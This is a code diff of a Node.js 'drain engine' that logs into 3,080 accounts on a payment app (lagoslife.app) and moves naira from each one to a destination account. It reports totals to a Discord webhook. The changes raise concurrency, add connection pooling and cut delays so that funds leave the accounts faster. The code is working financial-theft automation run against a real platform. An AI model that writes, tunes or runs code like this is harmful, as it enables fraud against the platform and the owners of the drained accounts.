@@ -1,4 +1,13 @@
 const fs = require('fs');
+const { Agent, setGlobalDispatcher } = require('undici');
+
+// Tune global dispatcher for high-concurrency keep-alive connection pooling
+setGlobalDispatcher(new Agent({
+  connections: 250,
+  pipelining: 10,
+  keepAliveTimeout: 60000,
+  keepAliveMaxTimeout: 60000,
+}));
 
 const API = "https://lagoslife.app/api";
 const TO = process.env.TO;
@@ -7,7 +16,7 @@ const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
 const FEE = 50, MIN = 100, SEED = 10095950;
 const TEMPLATE = { u: "IDK6543210", p: "@Temi123" };
 const TARGET_HOURS = parseFloat(process.env.DURATION_HOURS || "0");
-const CONCURRENT_LIMIT = 15; // Kept at optimal 15 for stability under heavy server load
+const CONCURRENT_LIMIT = 20; // Balanced for high speed with keep-alive pooling
 
 const storeDir = './store';
 if (!fs.existsSync(storeDir)) fs.mkdirSync(storeDir);
@@ -75,6 +84,7 @@ async function sendDiscordAlert(message) {
 
   if (!loginRes.res.ok) {
     console.log("[ERROR] Template login failed");
+    sendDiscordAlert("[ERROR] Template login failed");
     return;
   }
 
@@ -87,7 +97,8 @@ async function sendDiscordAlert(message) {
   }
 
   delete clean.owner;
-  console.log("[READY] Fast drain engine online (Optimized & Paced).\n");
+  console.log("[READY] High-performance keep-alive drain engine online with Discord.\n");
+  sendDiscordAlert("🚀 High-performance keep-alive drain engine online with 3,080 accounts loaded.");
 
   const sessionStart = Date.now();
   let sessionTotalSent = 0, globalCycles = 0;
@@ -99,7 +110,7 @@ async function sendDiscordAlert(message) {
     let currentIndex = 0, cycleTotal = 0;
 
     async function worker(workerId) {
-      await sleep(Math.floor(Math.random() * 300) + (workerId * 50));
+      await sleep(Math.floor(Math.random() * 200) + (workerId * 30));
 
       while (currentIndex < ledger.length) {
         const actualIndex = currentIndex++;
@@ -167,19 +178,18 @@ async function sendDiscordAlert(message) {
             if (sr.res.ok) {
               cycleTotal += amount;
               sessionTotalSent += amount;
-              console.log(`[Cycle ${globalCycles} | ${actualIndex + 1}/${ledger.length}] ${a.u} -> Sent ₦${amount.toLocaleString()} | Session Total: ₦${sessionTotalSent.toLocaleString()}`);
+              console.log(`[C${globalCycles}|${actualIndex + 1}] ${a.u} -> ₦${amount.toLocaleString()} | Total: ₦${sessionTotalSent.toLocaleString()}`);
               break;
             } else {
               const errText = typeof sr.res.text === 'function' ? await sr.res.text() : '';
               if (errText.includes("try again")) {
-                await sleep(100 + Math.floor(Math.random() * 100));
+                await sleep(80 + Math.floor(Math.random() * 80));
                 continue;
               }
               break;
             }
           }
 
-          // Micro-pacing to keep connections fluid under 50k user load
           await sleep(10 + Math.floor(Math.random() * 15));
         } catch (e) {}
       }
@@ -189,6 +199,6 @@ async function sendDiscordAlert(message) {
     secureShuffle(ledger);
 
     if (global.gc) global.gc();
-    await sleep(500);
+    await sleep(300);
   }
 })();
